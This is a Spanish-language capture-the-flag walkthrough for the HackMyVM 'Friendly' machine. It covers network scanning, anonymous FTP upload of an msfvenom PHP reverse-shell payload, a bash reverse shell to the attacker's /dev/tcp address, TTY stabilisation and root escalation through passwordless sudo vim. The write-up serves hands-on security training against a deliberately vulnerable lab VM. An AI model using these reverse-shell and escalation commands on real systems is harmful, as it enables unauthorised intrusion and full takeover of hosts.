Maquinas que vamos a utilizar **Kali Linux y Friendly** [https://hackmyvm.eu/machines/machine.php?vm=Friendly](https://hackmyvm.eu/machines/machine.php?vm=Friendly)

  

Una vez hayamos obtenido acceso remoto al servidor, es necesario proceder con la escalada de privilegios, para poder convertirnos en el usuario root del sistema y así contar con todo tipo de permisos sobre el mismo.

  

```Bash
sudo arp-scan -I eth0 --localnet
```

![[Imagenes/image 55.png|image 55.png]]

  

```Bash
ping -c 1 10.0.3.21
```

![[Imagenes/image 1 44.png|image 1 44.png]]

  

```Bash
nmap -p- -sS -sV -sC --open -min-rate=5000 -n -vvv -Pn 10.0.3.21 
```

![[Imagenes/image 2 43.png|image 2 43.png]]

Vemos que esta habilitado el login como Anonymous en el FTP por el puerto 21.

  

- Accedemos por el FTP
    
    ```Bash
    ftp 10.0.3.21 
    ```
    
    ![[Imagenes/image 3 42.png|image 3 42.png]]
    
    Usuario anonymous contraseña la dejamos en blanco.
    
    Salimos del FTP
    
    `exit`
    

  

- Creamos un archivo malicioso con msfvenom en el escritorio.
    
    ```Bash
    msfvenom -p php/reverse_php LHOST=10.0.3.4 LPORT=443 -f raw > pwned.php
    ```
    
    ![[Imagenes/image 4 40.png|image 4 40.png]]
    

  

- Volvemos a entrar el el FTP como la vez anterior
    
    ```Bash
    ftp 10.0.3.21 
    ```
    
    ![[Imagenes/image 5 39.png|image 5 39.png]]
    
      
    
    - Subimos el archivo **pwned.php.**
        
        `put pwned.php`
        
        ![[Imagenes/image 6 37.png|image 6 37.png]]
        
        `exit`
        
    
      
    
- Nos ponemos a la escucha con netcat por el puerto 443 que era el de muestro archivo malicioso..
    
    ```Bash
    nc -nlvp 443 
    ```
    
    ![[Imagenes/image 7 35.png|image 7 35.png]]
    

  

- Como ya hemos aprendido una conexión creada por msfvemon es muy inestable así que vamos a estabilizarla. Nos vamos a la web [https://www.revshells.com/](https://www.revshells.com/) y copiamos el código generado.
    
    ![[Imagenes/image 8 33.png|image 8 33.png]]
    

  

- En otra terminal nos ponemos a la escucha con netcat por el puerto 444 que es el que hemos puesto en el código que acabamos de generar.
    
    ```Bash
    nc -nlvp 444 
    ```
    
    ![[Imagenes/image 9 30.png|image 9 30.png]]
    
      
    
- Nos vamos al navegador web y ponemos la URL http://10.0.3.21/pwned.php
    
    ![[Imagenes/image 10 26.png|image 10 26.png]]
    
    ![[Imagenes/image 11 20.png|image 11 20.png]]
    

  

- Escribimos lo siguiente
    
    `bash -c "sh -i >& /dev/tcp/10.0.3.4/444 0>&1"`
    
    ![[Imagenes/image 12 20.png|image 12 20.png]]
    
    ![[Imagenes/image 13 19.png|image 13 19.png]]
    

  

Hasta aquí ya lo habíamos visto.

  

---

  

- **Tratamiento de la TTY**
    
    `script /dev/null -c bash`
    
    `CTRL+Z`
    
    ![[Imagenes/image 14 17.png|image 14 17.png]]
    

`stty raw -echo; fg`

`reset xterm`

![[Imagenes/image 15 14.png|image 15 14.png]]

`export TERM=xterm`

`export SHELL=bash`

![[Imagenes/image 16 11.png|image 16 11.png]]

  

---

  

- Vamos a ver **escaladas de privilegios básicas** vamos a utilizar **sodo -l** , este comando a veces funciona y a veces no pero si funciona anos puede dar información útil.
    
    `sudo -l`
    
    ![[Imagenes/image 17 9.png|image 17 9.png]]
    
      
    
    ![[Imagenes/image 18 7.png|image 18 7.png]]
    
    > [!important] Este mensaje indica que el usuario **www-data (en este caso soy yo, podemos comprobarlo haciendo un whoami)** puede **ejecutar el comando vim** en el sistema llamado friendly **sin necesidad de contraseña** (NOPASSWD). Además, **no hay restricciones** sobre qué comandos o privilegios puede usar (ALL : ALL). **En resumen, este usuario tiene acceso sin restricciones a ejecutar vim.**
    
      
    
    Nos puede aparecer vim como otras herramientas. Como es lógico es imposible saber de memoria como escalar en cada herramienta. por eso vamos a utilizar la web [https://gtfobins.github.io/](https://gtfobins.github.io/).
    
      
    
    ![[Imagenes/image 19 5.png|image 19 5.png]]
    
      
    
    En el buscador de la web ponemos la herramienta que nos a parecido y con la cual queremos escalar privilegios.
    
    ![[Imagenes/image 20 5.png|image 20 5.png]]
    
    ![[Imagenes/image 21 4.png|image 21 4.png]]
    

- Nos debemos preguntar ¿Cómo hemos enumerado que podemos utilizar vim?
    
    ![[Imagenes/image 22 4.png|image 22 4.png]]
    
    Lo hemos hecho con el comando **SUDO**
    

  

- Nos movemos hasta encontrar **Sudo** en la web **dentro de Vim**
    
    ![[Imagenes/image 23 4.png|image 23 4.png]]
    
    Vemos que tenemos varios opciones. Probamos la primera.
    
    `sudo /usr/bin/vim -c ':!/bin/sh'`
    
    ![[Imagenes/image 24 3.png|image 24 3.png]]
    
    Si funciona nos convertimos en Root
    
    ![[Imagenes/image 25 3.png|image 25 3.png]]